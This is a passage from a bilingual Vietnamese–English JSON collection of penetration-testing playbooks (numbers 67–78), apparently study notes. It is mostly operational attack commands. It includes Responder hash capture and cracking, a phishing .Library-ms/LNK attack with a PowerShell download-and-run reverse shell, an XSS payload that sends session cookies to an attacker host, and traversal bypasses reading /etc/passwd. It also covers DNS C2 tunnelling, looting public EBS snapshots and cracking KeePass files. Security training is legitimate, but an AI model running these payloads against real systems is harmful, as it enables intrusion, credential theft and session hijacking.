      {"vi": "**T·∫°o File Rule:**", "en": "**Create Rule File:**", "command": "echo 'c $2 $0 $2 $5 $!' > myrule.rule" },
      {"vi": "**Ch·∫°y Hashcat v·ªõi Rule:**", "en": "**Run Hashcat with Rule:**", "command": "hashcat -m <hash_mode> hashes.txt wordlist.txt -r myrule.rule --force" },
      {"vi": "**Xem K·∫øt qu·∫£:**", "en": "**Show Results:**", "command": "hashcat -m <hash_mode> hashes.txt --show" }
    ],
    "related_knowledge_ids": ["password_cracking_mutating_wordlists", "hashcat", "rules"]
  },
  "playbook_67_capture_crack_netntlmv2": {
    "title": {
      "vi": "Playbook 67: Capture & Crack NetNTLMv2 Hash",
      "en": "Playbook 67: Capture & Crack NetNTLMv2 Hash"
    },
    "assumption": "C√≥ th·ªÉ k√≠ch ho·∫°t x√°c th·ª±c SMB/HTTP t·ª´ target ƒë·∫øn Kali.",
    "objective": "B·∫Øt NetNTLMv2 hash b·∫±ng Responder/Impacket, crack b·∫±ng Hashcat.",
    "tools": ["responder", "impacket-smbserver", "hashcat", "nc (ƒë·ªÉ test)"],
    "phases": ["Credential Access"],
    "techniques": ["NTLM Relay (Capture Phase)", "Offline Hash Cracking"],
    "targets": ["Windows Authentication", "NetNTLMv2 Hash"],
    "os": ["Windows (Target)", "Linux (Kali)"],
    "tags": ["credential hunting", "netntlmv2", "responder", "impacket-smbserver", "hashcat", "mode_5600", "offline hash cracking"],
    "content": "## Playbook 67: Capture & Crack NetNTLMv2 üé£üîë‚û°Ô∏èüîì\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ th·ªÉ k√≠ch ho·∫°t x√°c th·ª±c NTLM t·ª´ target ƒë·∫øn Kali.\n\n**M·ª•c ti√™u:** B·∫Øt v√† crack NetNTLMv2 hash.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ch·∫°y Listener (Kali):** `sudo responder -I <iface>` ho·∫∑c `sudo impacket-smbserver SHARE /tmp`.\n2.  **K√≠ch ho·∫°t X√°c th·ª±c (Target):** `dir \\\\<KALI_IP>\\fakepath`.\n3.  **L·∫•y Hash:** Copy hash t·ª´ output c·ªßa listener.\n4.  **Crack Hash (Kali):** `hashcat -m 5600 hash.txt wordlist.txt`.",
    "steps": [
      {"vi": "**Ch·∫°y Responder (Kali):**", "en": "**Run Responder (Kali):**", "command": "sudo responder -I eth0 -v"},
      {"vi": "**Ho·∫∑c Ch·∫°y Impacket SMB (Kali):**", "en": "**Or Run Impacket SMB (Kali):**", "command": "sudo impacket-smbserver -smb2support SHARE /tmp/share"},
      {"vi": "**K√≠ch ho·∫°t X√°c th·ª±c (Target):**", "en": "**Trigger Authentication (Target):**", "command": "dir \\\\<KALI_IP>\\fakepath"},
      {"vi": "**L·∫•y Hash:**", "en": "**Capture Hash:**", "command": "# Copy hash from Responder/Impacket output"},
      {"vi": "**Crack Hash (Hashcat):**", "en": "**Crack Hash (Hashcat):**", "command": "hashcat -m 5600 captured.hash wordlist.txt"}
    ],
    "related_knowledge_ids": ["password_cracking_net_ntlmv2", "responder", "impacket-smbserver", "hashcat", "mode_5600", "password_cracking_lab_net_ntlmv2"]
  },
  "playbook_68_client_side_library_lnk": {
    "title": {
      "vi": "Playbook 68: Client-Side - Windows Library (.Library-ms) + LNK Attack",
      "en": "Playbook 68: Client-Side - Windows Library (.Library-ms) + LNK Attack"
    },
    "assumption": "C√≥ th·ªÉ l·ª´a ng∆∞·ªùi d√πng Windows m·ªü file `.Library-ms`.",
    "objective": "T·∫°o file `.Library-ms` v√† `.lnk` ƒë·ªôc h·∫°i, host tr√™n WebDAV, ƒë·ªÉ c√≥ reverse shell.",
    "tools": ["wsgidav", "python (http.server)", "text editor", "powershell (for payload)", "swaks (for delivery)"],
    "phases": ["Initial Foothold", "Social Engineering"],
    "techniques": ["Client-Side Execution", "Windows Library File Abuse", "LNK File Abuse", "WebDAV", "Reverse Shell"],
    "targets": ["Windows User", ".Library-ms", ".lnk"],
    "os": ["Windows", "Linux (Kali for hosting)"],
    "tags": ["client-side", "windows", "library-ms", "lnk", "webdav", "wsgidav", "reverse shell", "phishing", "powercat"],
    "content": "## Playbook 68: Client-Side - Library + LNK Attack üé£üìöüîó‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ th·ªÉ l·ª´a user m·ªü file `.Library-ms`.\n\n**M·ª•c ti√™u:** C√≥ reverse shell qua WebDAV v√† LNK.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Payload (Kali):** Host `powercat.ps1` (`python http.server`), t·∫°o l·ªánh PS reverse shell.\n2.  **WebDAV (Kali):** C√†i `wsgidav`, t·∫°o dir `webdav`, ch·∫°y `wsgidav ... --auth anonymous`.\n3.  **File LNK (Kali):** T·∫°o `payload.lnk` trong `webdav` tr·ªè ƒë·∫øn l·ªánh PS.\n4.  **File Library-ms (Kali):** T·∫°o XML `config.Library-ms` tr·ªè ƒë·∫øn `http://<kali_ip>`.\n5.  **Listener:** `nc -lvnp 4444`.\n6.  **G·ª≠i File:** G·ª≠i `.Library-ms` cho n·∫°n nh√¢n.",
    "steps": [
      {"vi": "**Chu·∫©n b·ªã Payload PS & HTTP Server (Kali):**", "en": "**Prepare PS Payload & HTTP Server (Kali):**", "command": "echo 'powershell -c \"IEX(iwr http://<kali_ip>:8000/pc.ps1);pc -c <kali_ip> -p 4444 -e powershell\"' > payload.txt; python3 -m http.server 8000"},
      {"vi": "**Ch·∫°y WebDAV Server (Kali):**", "en": "**Run WebDAV Server (Kali):**", "command": "mkdir webdav; wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ./webdav"},
      {"vi": "**T·∫°o LNK File tr·ªè payload (trong webdav):**", "en": "**Create LNK File pointing to payload (in webdav):**", "command": "# Create payload.lnk targeting powershell command from step 1"},
      {"vi": "**T·∫°o Library-ms File:**", "en": "**Create Library-ms File:**", "command": "# Create XML file pointing to http://<kali_ip> (See knowledge base)"},
      {"vi": "**M·ªü Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4444"},
      {"vi": "**G·ª≠i File Library-ms:**", "en": "**Send Library-ms File:**", "command": "# Deliver file via email/share"}
    ],
    "related_knowledge_ids": ["clientside_windows_libraries_theory", "wsgidav", "python", "http_server", "powershell", "powercat", "library-ms", "lnk", "rce_kali_setup", "nc"]
  },
  "playbook_69_pivoting_plink": {
    "title": {
      "vi": "Playbook 69: Pivoting - SSH Remote Port Forwarding v·ªõi Plink",
      "en": "Playbook 69: Pivoting - SSH Remote Port Forwarding with Plink"
    },
    "assumption": "C√≥ shell tr√™n Windows Box A (Pivot). Box A k·∫øt n·ªëi ƒë∆∞·ª£c SSH ra Kali. C·∫ßn truy c·∫≠p c·ªïng n·ªôi b·ªô t·ª´ Kali.",
    "objective": "S·ª≠ d·ª•ng `Plink.exe` ƒë·ªÉ t·∫°o SSH remote tunnel (-R) t·ª´ Box A v·ªÅ Kali.",
    "tools": ["plink.exe", "ssh (server on Kali)", "xfreerdp"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["SSH Tunneling", "Remote Port Forwarding"],
    "targets": ["Internal Network Service"],
    "os": ["Windows", "Linux (Kali)"],
    "tags": ["pivoting", "windows", "plink", "ssh", "ssh tunneling", "remote port forwarding", "ssh_r"],
    "content": "## Playbook 69: Pivoting - Plink Remote Forwarding üö∂‚Äç‚ôÇÔ∏èüîó‚¨ÖÔ∏èüéØ\n\n**Gi·∫£ ƒë·ªãnh:** Shell tr√™n Pivot Windows, SSH outbound ok, c·∫ßn truy c·∫≠p c·ªïng n·ªôi b·ªô.\n\n**M·ª•c ti√™u:** T·∫°o SSH remote tunnel (-R) b·∫±ng Plink.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Kali:** B·∫≠t SSH server (`systemctl start ssh`).\n2.  **Target:** T·∫£i `plink.exe` l√™n.\n3.  **Target:** Ch·∫°y Plink: `cmd /c echo y | plink.exe -ssh -l kali -pw kali -R 127.0.0.1:[Listen_Kali]:<target_ip>:[Target_Port] <kali_ip>`.\n4.  **Kali:** K·∫øt n·ªëi ƒë·∫øn `127.0.0.1:[Listen_Kali]`.",
    "steps": [
      {"vi": "**B·∫≠t SSH Server (Kali):**", "en": "**Start SSH Server (Kali):**", "command": "sudo systemctl start ssh"},
      {"vi": "**T·∫£i Plink l√™n Target:**", "en": "**Upload Plink to Target:**", "command": "# Transfer plink.exe to C:\\Windows\\Temp\\"},
      {"vi": "**Ch·∫°y Plink Remote Forward (Target):**", "en": "**Run Plink Remote Forward (Target):**", "command": "cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:[Listen_Port_Kali]:<target_ip>:[Target_Port] <kali_ip>"},
      {"vi": "**Truy c·∫≠p t·ª´ Kali (V√≠ d·ª• RDP):**", "en": "**Access from Kali (Example RDP):**", "command": "xfreerdp /v:127.0.0.1:[Listen_Port_Kali] /u:user /p:pass"}
    ],
    "related_knowledge_ids": ["portfwd_windows_plink", "plink", "ssh", "ssh_r", "remote_port_forwarding", "xfreerdp", "connect_rdp_xfreerdp"]
  },
  "playbook_70_pivoting_dnscat2": {
    "title": {
      "vi": "Playbook 70: Pivoting - DNS Tunneling v·ªõi dnscat2",
      "en": "Playbook 70: Pivoting - DNS Tunneling with dnscat2"
    },
    "assumption": "C√≥ shell tr√™n Pivot. Ch·ªâ c√≥ DNS outbound ho·∫°t ƒë·ªông.",
    "objective": "Thi·∫øt l·∫≠p C2 tunnel qua DNS b·∫±ng dnscat2, c√≥ th·ªÉ forward c·ªïng.",
    "tools": ["dnscat2-server", "dnscat2-client (powershell/c)"],
    "phases": ["Pivoting", "Command and Control", "Post Exploitation"],
    "techniques": ["DNS Tunneling", "Command and Control", "Port Forwarding"],
    "targets": ["DNS Protocol"],
    "os": ["Any"],
    "tags": ["pivoting", "dns tunneling", "dnscat2", "c2", "port forwarding", "dns"],
    "content": "## Playbook 70: Pivoting - DNS Tunneling v·ªõi dnscat2 üö∂‚Äç‚ôÇÔ∏èüöá‚û°Ô∏èüåç (DNS)\n\n**Gi·∫£ ƒë·ªãnh:** Ch·ªâ c√≥ DNS outbound ho·∫°t ƒë·ªông tr√™n Pivot.\n\n**M·ª•c ti√™u:** T·∫°o C2 tunnel qua DNS, c√≥ th·ªÉ forward c·ªïng.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Kali:** Ch·∫°y server `sudo dnscat2-server <Domain/IP> --secret=<Secret>`.\n2.  **Target:** T·∫£i & ch·∫°y client (PS ho·∫∑c C) `dnscat2 --secret=<Secret> <Domain/IP>`.\n3.  **Kali (Console):** `sessions`, `session -i <id>`.\n4.  **Kali (Console):** L·ªánh `shell`, `exec`, `listen <kali_ip:port> <target_ip:port>`.",
    "steps": [
      {"vi": "**Ch·∫°y Server (Kali):**", "en": "**Run Server (Kali):**", "command": "sudo dnscat2-server <Your_Domain_Or_IP> --secret=<YourSecret>"},
      {"vi": "**Ch·∫°y Client (Target - C):**", "en": "**Run Client (Target - C):**", "command": "./dnscat2 --secret=<YourSecret> <Your_Domain_Or_IP>"},
      {"vi": "**T∆∞∆°ng t√°c (dnscat2 console):**", "en": "**Interact (dnscat2 console):**", "command": "sessions -> session -i <id> -> shell"},
      {"vi": "**Thi·∫øt l·∫≠p Port Forward (dnscat2 console):**", "en": "**Setup Port Forward (dnscat2 console):**", "command": "listen 0.0.0.0:8080 10.0.0.5:80"}
    ],
    "related_knowledge_ids": ["dns_tunneling_dnscat2", "pivoting", "dnscat2"]
  },
  "playbook_71_aws_exploit_public_snapshot": {
    "title": {
      "vi": "Playbook 71: AWS - Khai th√°c EBS Snapshot C√¥ng khai",
      "en": "Playbook 71: AWS - Exploiting Public EBS Snapshot"
    },
    "assumption": "T√¨m th·∫•y EBS snapshot c√¥ng khai/chia s·∫ª.",
    "objective": "T·∫°o volume t·ª´ snapshot, mount v√†o EC2, tr√≠ch xu·∫•t d·ªØ li·ªáu.",
    "tools": ["aws cli"],
    "phases": ["Exploitation", "Credential Access", "Data Exfiltration"],
    "techniques": ["AWS EBS Snapshot Exploitation"],
    "targets": ["AWS EBS Snapshot", "EC2 Instance"],
    "os": ["Any (AWS Environment)"],
    "tags": ["aws", "cloud", "ebs", "snapshot", "exploitation", "aws cli", "ec2", "credential hunting"],
    "content": "## Playbook 71: AWS - Khai th√°c EBS Snapshot C√¥ng khai ‚òÅÔ∏èüíæ‚û°Ô∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** T√¨m th·∫•y EBS snapshot c√¥ng khai/chia s·∫ª.\n\n**M·ª•c ti√™u:** T·∫°o volume, mount v√† tr√≠ch xu·∫•t d·ªØ li·ªáu.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán (AWS CLI):**\n\n1.  **T·∫°o Volume:** `aws ec2 create-volume --snapshot-id <snap_id> --availability-zone <az>`.\n2.  **Attach Volume:** `aws ec2 attach-volume --volume-id <vol_id> --instance-id <ec2_id> --device /dev/xvdf`.\n3.  **SSH v√†o EC2.**\n4.  **Mount Volume:** `lsblk`, `sudo mkdir /mnt/data`, `sudo mount /dev/xvdf1 /mnt/data`.\n5.  **Tr√≠ch xu·∫•t D·ªØ li·ªáu:** `grep -ri 'password' /mnt/data`.\n6.  **D·ªçn d·∫πp:** `umount`, `detach-volume`, `delete-volume`.",
    "steps": [
      {"vi": "**T·∫°o Volume t·ª´ Snapshot:**", "en": "**Create Volume from Snapshot:**", "command": "aws ec2 create-volume --snapshot-id <snap_id> --availability-zone <your_az>"},
      {"vi": "**Attach Volume v√†o Instance:**", "en": "**Attach Volume to Instance:**", "command": "aws ec2 attach-volume --volume-id <vol_id> --instance-id <instance_id> --device /dev/xvdf"},
      {"vi": "**Mount Volume (Trong EC2):**", "en": "**Mount Volume (Inside EC2):**", "command": "sudo mkdir /mnt/data; sudo mount /dev/xvdf1 /mnt/data"}, // Gi·∫£ s·ª≠ c√≥ partition
      {"vi": "**T√¨m ki·∫øm D·ªØ li·ªáu:**", "en": "**Search for Data:**", "command": "grep -riE 'password|secret|key' /mnt/data"},
      {"vi": "**D·ªçn d·∫πp:**", "en": "**Cleanup:**", "command": "sudo umount /mnt/data; aws ec2 detach-volume ...; aws ec2 delete-volume ..."}
    ],
    "related_knowledge_ids": ["aws_enum_api_public_resources", "aws cli", "ebs", "ec2"]
  },
  "playbook_72_xss_cookie_steal_basic": {
    "title": {
      "vi": "Playbook 72: XSS - ƒê√°nh c·∫Øp Cookie (C∆° b·∫£n)",
      "en": "Playbook 72: XSS - Cookie Stealing (Basic)"
    },
    "assumption": "Ph√°t hi·ªán XSS (Reflected/Stored) tr√™n trang c·∫ßn login.",
    "objective": "Ch√®n JS ƒë·ªÉ g·ª≠i cookie session v·ªÅ server k·∫ª t·∫•n c√¥ng.",
    "tools": ["python (http.server)", "nc", "browser", "javascript"],
    "phases": ["Exploitation", "Credential Access"],
    "techniques": ["Cross-Site Scripting (XSS)", "Cookie Stealing", "Session Hijacking"],
    "targets": ["Web Application User Session"],
    "os": ["Any"],
    "tags": ["web", "xss", "cross-site scripting", "cookie stealing", "session hijacking", "javascript", "reflected", "stored"],
    "content": "## Playbook 72: XSS - ƒê√°nh c·∫Øp Cookie üç™üé£\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán XSS.\n\n**M·ª•c ti√™u:** G·ª≠i cookie v·ªÅ server attacker.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Listener (Kali):** `sudo python3 -m http.server 80` ho·∫∑c `nc -lvnp 80`.\n2.  **Payload XSS:** `<script>document.location='http://<kali_ip>/?c=' + document.cookie;</script>`.\n3.  **Ch√®n Payload:** V√†o URL (Reflected) ho·∫∑c field (Stored).\n4.  **Nh·∫≠n Cookie:** Ki·ªÉm tra log listener.\n5.  **S·ª≠ d·ª•ng Cookie:** D√πng Cookie Editor ho·∫∑c Burp.",
    "steps": [
      {"vi": "**Ch·∫°y Listener (Kali - HTTP):**", "en": "**Run Listener (Kali - HTTP):**", "command": "sudo python3 -m http.server 80"},
      {"vi": "**T·∫°o Payload XSS:**", "en": "**Create XSS Payload:**", "command": "<script>document.location='http://<kali_ip>/?c=' + document.cookie;</script>"},
      {"vi": "**Ch√®n Payload:**", "en": "**Inject Payload:**", "command": "# Inject into vulnerable parameter/field"},
      {"vi": "**Nh·∫≠n Cookie:**", "en": "**Receive Cookie:**", "command": "# Check HTTP server log on Kali"},
      {"vi": "**S·ª≠ d·ª•ng Cookie:**", "en": "**Use Cookie:**", "command": "# Use Cookie Editor or Burp to set the stolen cookie"}
    ],
    "related_knowledge_ids": ["xss", "javascript", "cookie stealing", "session hijacking", "python", "http_server", "nc"]
  },
  "playbook_73_dir_traversal_encoding": {
    "title": {
      "vi": "Playbook 73: Directory Traversal - Bypass Filter b·∫±ng Encoding",
      "en": "Playbook 73: Directory Traversal - Filter Bypass via Encoding"
    },
    "assumption": "Nghi ng·ªù Directory Traversal nh∆∞ng `../../` b·ªã ch·∫∑n.",
    "objective": "S·ª≠ d·ª•ng encoding (URL, Double URL) ƒë·ªÉ bypass filter.",
    "tools": ["curl", "burpsuite", "browser"],
    "phases": ["Exploitation"],
    "techniques": ["Directory Traversal", "Filter Bypass", "URL Encoding"],
    "targets": ["Web Application Filter"],
    "os": ["Any"],
    "tags": ["web", "directory traversal", "path traversal", "filter bypass", "encoding", "url encoding", "curl"],
    "content": "## Playbook 73: Directory Traversal - Encoding Bypass üîìüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** Payload `../../` b·ªã ch·∫∑n.\n\n**M·ª•c ti√™u:** Bypass filter b·∫±ng encoding.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Th·ª≠ URL Encode:** `..%2f` -> `%2e%2e%2f`.\n2.  **Th·ª≠ Double URL Encode:** `%2e%2e%2f` -> `%252e%252e%252f`.\n3.  **Th·ª≠ Encoding Kh√°c:** `..%c0%af`, `..%u2215`.\n4.  **Th·ª≠ Path Truncation:** `...passwd%00.jpg`, `...passwd/.`.",
    "steps": [
      {"vi": "**Th·ª≠ URL Encoding:**", "en": "**Try URL Encoding:**", "command": "curl \"http://<target_ip>/vuln.php?file=%2e%2e%2f%2e%2e%2fetc/passwd\""},
      {"vi": "**Th·ª≠ Double URL Encoding:**", "en": "**Try Double URL Encoding:**", "command": "curl \"http://<target_ip>/vuln.php?file=%252e%252e%252f%252e%252e%252fetc/passwd\""},
      {"vi": "**Th·ª≠ Path Truncation (Null Byte):**", "en": "**Try Path Truncation (Null Byte):**", "command": "curl \"http://<target_ip>/vuln.php?file=../../etc/passwd%00.jpg\""}
    ],
    "related_knowledge_ids": ["directory_traversal", "filter bypass", "url encoding", "web_attack_directory_traversal", "lfi"]
  },
  "playbook_74_fix_exploit_cross_compile": {
    "title": {
      "vi": "Playbook 74: S·ª≠a l·ªói Exploit - Cross-Compiling (mingw-w64)",
      "en": "Playbook 74: Fixing Exploits - Cross-Compiling (mingw-w64)"
    },
    "assumption": "C√≥ m√£ ngu·ªìn exploit C/C++ cho Windows, ƒëang ·ªü Kali.",
    "objective": "Bi√™n d·ªãch ch√©o m√£ ngu·ªìn th√†nh file .exe tr√™n Kali.",
    "tools": ["mingw-w64 (gcc)", "searchsploit"],
    "phases": ["Exploitation", "Exploit Development"],
    "techniques": ["Cross-Compiling", "Exploit Modification"],
    "targets": ["Windows Executable (PE)"],
    "os": ["Windows", "Linux (Kali for compiling)"],
    "tags": ["exploit", "fixing exploits", "cross-compile", "mingw-w64", "windows", "c", "gcc"],
    "content": "## Playbook 74: S·ª≠a l·ªói Exploit - Cross-Compiling üêß‚û°Ô∏èüíª.exe\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ m√£ ngu·ªìn C/C++ cho Windows, c·∫ßn compile tr√™n Kali.\n\n**M·ª•c ti√™u:** Bi√™n d·ªãch ch√©o ra file `.exe`.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **C√†i mingw-w64 (Kali):** `sudo apt install mingw-w64`.\n2.  **L·∫•y M√£ Ngu·ªìn.**\n3.  **S·ª≠a ƒë·ªïi (N·∫øu c·∫ßn).**\n4.  **Compile 32-bit:** `i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32`.\n5.  **Compile 64-bit:** `x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe -lws2_32`.\n6.  **Chuy·ªÉn & Th·ª±c thi.**",
    "steps": [
      {"vi": "**C√†i mingw-w64 (Kali):**", "en": "**Install mingw-w64 (Kali):**", "command": "sudo apt install mingw-w64 -y"},
      {"vi": "**Compile 32-bit:**", "en": "**Compile 32-bit:**", "command": "i686-w64-mingw32-gcc exploit.c -o exploit_x86.exe -lws2_32"},
      {"vi": "**Compile 64-bit:**", "en": "**Compile 64-bit:**", "command": "x86_64-w64-mingw32-gcc exploit.c -o exploit_x64.exe -lws2_32"},
      {"vi": "**Chuy·ªÉn & Th·ª±c thi:**", "en": "**Transfer & Execute:**", "command": "# Transfer .exe to target and run"}
    ],
    "related_knowledge_ids": ["fix_exploit_memory_corruption_compile", "mingw-w64", "gcc", "searchsploit"]
  },
  "playbook_75_git_recon_deep": {
    "title": {
      "vi": "Playbook 75: Git Recon - Ph√¢n t√≠ch L·ªãch s·ª≠ Commit",
      "en": "Playbook 75: Git Recon - Analyzing Commit History"
    },
    "assumption": "ƒê√£ t·∫£i v·ªÅ kho l∆∞u tr·ªØ `.git` b·ªã l·ªô.",
    "objective": "Ph√¢n t√≠ch l·ªãch s·ª≠ commit Git ƒë·ªÉ t√¨m secrets.",
    "tools": ["git", "git-dumper", "gitleaks"],
    "phases": ["Reconnaissance", "Enumeration", "Credential Access"],
    "techniques": ["Git Reconnaissance", "Credential Hunting"],
    "targets": ["Git Repository"],
    "os": ["Any"],
    "tags": ["recon", "enumeration", "git", "git log", "git show", "git-dumper", "gitleaks", "credential hunting", "secrets"],
    "content": "## Playbook 75: Git Recon - Ph√¢n t√≠ch L·ªãch s·ª≠ Commit üïµÔ∏è‚Äç‚ôÇÔ∏è‚è≥‚û°Ô∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** ƒê√£ t·∫£i v·ªÅ repo `.git`.\n\n**M·ª•c ti√™u:** T√¨m secrets trong l·ªãch s·ª≠ commit.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Qu√©t Gitleaks:** `gitleaks detect -s . -v`.\n2.  **Xem Log:** `git log --stat` ho·∫∑c `git log -p`.\n3.  **Ki·ªÉm tra Commit:** `git show <commit_id>`.\n4.  **Ki·ªÉm tra Branch:** `git branch -a`, `git checkout <branch>`.",
    "steps": [
      {"vi": "**Dump Repo (N·∫øu t·ª´ Web):**", "en": "**Dump Repo (If from Web):**", "command": "git-dumper http://<target_ip>/.git/ ./repo_dump"},
      {"vi": "**Qu√©t Gitleaks:**", "en": "**Scan Gitleaks:**", "command": "cd repo_dump; gitleaks detect -s . -v"},
      {"vi": "**Xem Log Commit:**", "en": "**View Commit Log:**", "command": "git log --stat"},
      {"vi": "**Xem Chi ti·∫øt Commit:**", "en": "**View Commit Details:**", "command": "git show <commit_id>"},
      {"vi": "**Ki·ªÉm tra Branch Kh√°c:**", "en": "**Check Other Branches:**", "command": "git branch -a; git checkout <branch_name>"}
    ],
    "related_knowledge_ids": ["github_recon_git", "git", "git log", "git show", "git-dumper", "gitleaks"]
  },
  "playbook_76_keepass_crack": {
    "title": {
      "vi": "Playbook 76: T√¨m v√† Crack File KeePass (.kdbx)",
      "en": "Playbook 76: Finding and Cracking KeePass Files (.kdbx)"
    },
    "assumption": "C√≥ shell tr√™n target. Nghi ng·ªù user d√πng KeePass.",
    "objective": "T√¨m file `.kdbx` v√† crack master password.",
    "tools": ["find", "Get-ChildItem", "keepass2john", "john", "hashcat"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Hunting", "Password Manager Cracking", "Offline Hash Cracking"],
    "targets": ["KeePass Database (.kdbx)"],
    "os": ["Windows", "Linux"],
    "tags": ["credential hunting", "keepass", "kdbx", "password manager", "find", "get-childitem", "keepass2john", "john", "hashcat", "mode_13400"],
    "content": "## Playbook 76: T√¨m v√† Crack KeePass (.kdbx) üïµÔ∏è‚Äç‚ôÇÔ∏èüì¶‚û°Ô∏èüîë‚û°Ô∏èüîì\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell, nghi ng·ªù c√≥ file KeePass.\n\n**M·ª•c ti√™u:** T√¨m v√† crack file `.kdbx`.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m File:** `find / -name *.kdbx` (Linux) ho·∫∑c `Get-ChildItem -Path C:\\ -Include *.kdbx ...` (Windows).\n2.  **T·∫£i File v·ªÅ Kali.**\n3.  **Tr√≠ch xu·∫•t Hash:** `keepass2john db.kdbx > hash`.\n4.  **Crack (John):** `john --wordlist=wl hash`.\n5.  **Crack (Hashcat):** `hashcat -m 13400 hash wl`.",
    "steps": [
      {"vi": "**T√¨m File (Linux):**", "en": "**Find File (Linux):**", "command": "find / -name *.kdbx 2>/dev/null"},
      {"vi": "**T√¨m File (Windows):**", "en": "**Find File (Windows):**", "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -EA SilentlyContinue"},
      {"vi": "**T·∫£i File v·ªÅ Kali:**", "en": "**Download File to Kali:**"},
      {"vi": "**Tr√≠ch xu·∫•t Hash (Kali):**", "en": "**Extract Hash (Kali):**", "command": "keepass2john database.kdbx > keepass.hash"},
      {"vi": "**Crack (John):**", "en": "**Crack (John):**", "command": "john --wordlist=wl.txt keepass.hash"},
      {"vi": "**Crack (Hashcat):**", "en": "**Crack (Hashcat):**", "command": "hashcat -m 13400 keepass.hash wl.txt"}
    ],
    "related_knowledge_ids": ["find_kdbx_files", "find", "Get-ChildItem", "keepass2john", "john", "hashcat", "post_exploitation_kdbx_crack", "password_cracking_keepass", "mode_13400"]
  },
  "playbook_77_windows_foothold_creds_webconfig": {
    "title": {
      "vi": "Playbook 77: Windows Foothold qua Credentials trong web.config",
      "en": "Playbook 77: Windows Foothold via Credentials in web.config"
    },
    "assumption": "ƒê·ªçc ƒë∆∞·ª£c file `web.config` ch·ª©a connection string.",
    "objective": "Tr√≠ch xu·∫•t creds t·ª´ `web.config` v√† s·ª≠ d·ª•ng.",
    "tools": ["curl", "grep", "impacket-mssqlclient", "evil-winrm"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Credential Hunting", "Configuration File Analysis"],
    "targets": ["web.config", "Database Credentials", "Windows Credentials"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "credential hunting", "web.config", "iis", "asp.net", "database", "mssql", "impacket-mssqlclient"],
    "content": "## Playbook 77: Windows Foothold - Creds t·ª´ web.config üö™üìÑ‚û°Ô∏èüîë\n\n**Gi·∫£ ƒë·ªãnh:** ƒê·ªçc ƒë∆∞·ª£c `web.config`.\n\n**M·ª•c ti√™u:** Tr√≠ch xu·∫•t v√† s·ª≠ d·ª•ng credentials.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **L·∫•y N·ªôi dung:** `curl` ho·∫∑c `type`.\n2.  **T√¨m Connection String:** `<connectionStrings>`, `Password=`, `User ID=`.\n3.  **Th·ª≠ Creds:** K·∫øt n·ªëi DB (`impacket-mssqlclient`) ho·∫∑c th·ª≠ lateral movement (`crackmapexec`, `evil-winrm`).",
    "steps": [
      {"vi": "**L·∫•y web.config:**", "en": "**Get web.config:**", "command": "curl http://<target_ip>/path/to/web.config # Ho·∫∑c type C:\\inetpub\\wwwroot\\web.config"},
      {"vi": "**T√¨m Connection String:**", "en": "**Find Connection String:**", "command": "grep -iE 'connectionString|password=' web.config"},
      {"vi": "**Th·ª≠ K·∫øt n·ªëi MSSQL:**", "en": "**Try Connect MSSQL:**", "command": "impacket-mssqlclient <user>:<password>@<db_server>"},
      {"vi": "**Th·ª≠ Lateral Movement (CME):**", "en": "**Try Lateral Movement (CME):**", "command": "crackmapexec smb <target_ip> -u <user> -p '<password>'"}
    ],
    "related_knowledge_ids": ["winprivesc_password_hunting_files", "winprivesc_other_vectors", "web.config", "curl", "grep", "type", "impacket-mssqlclient", "crackmapexec", "evil-winrm_connection", "playbook_32_foothold_mssql_xpcmdshell"]
  },
  "playbook_78_linux_foothold_creds_wpconfig": {
    "title": {
      "vi": "Playbook 78: Linux Foothold qua Credentials trong wp-config.php",
      "en": "Playbook 78: Linux Foothold via Credentials in wp-config.php"
    },
    "assumption": "ƒê·ªçc ƒë∆∞·ª£c file `wp-config.php` c·ªßa WordPress.",
    "objective": "Tr√≠ch xu·∫•t creds DB (MySQL) v√† th·ª≠ s·ª≠ d·ª•ng ch√∫ng.",
    "tools": ["curl", "cat", "grep", "mysql", "ssh", "su"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Credential Hunting", "Configuration File Analysis"],
    "targets": ["wp-config.php", "Database Credentials", "Linux Credentials"],
    "os": ["Linux"],
    "tags": ["linux", "foothold", "credential hunting", "wordpress", "wp-config.php", "mysql", "database"],
